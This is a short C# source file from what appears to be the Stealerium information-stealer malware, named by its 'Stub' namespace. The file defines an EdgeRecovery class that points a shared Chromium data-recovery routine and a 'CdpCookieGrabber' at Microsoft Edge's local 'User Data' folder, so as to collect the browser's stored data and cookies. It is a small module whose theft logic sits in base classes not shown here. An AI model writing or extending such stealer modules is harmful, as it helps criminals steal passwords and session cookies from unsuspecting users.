using System.IO;
using Stealerium.Stub.Helpers;
using Stealerium.Stub.Target.Browsers.Common.Recovery;
using Stealerium.Stub.Target.Browsers.Chromium;

namespace Stealerium.Stub.Target.Browsers.Edge
{
    internal sealed class EdgeRecovery : ChromiumBasedRecovery
    {
        public EdgeRecovery(string savePath) : base(
            savePath,
            "Microsoft Edge",
            Path.Combine(Paths.Lappdata, "Microsoft\\Edge\\User Data"),
            CdpCookieGrabber.BrowserType.Edge)
        {
        }

        public static void Run(string savePath)
        {
            var recovery = new EdgeRecovery(savePath);
            recovery.RecoverBrowserData();
        }
    }
}
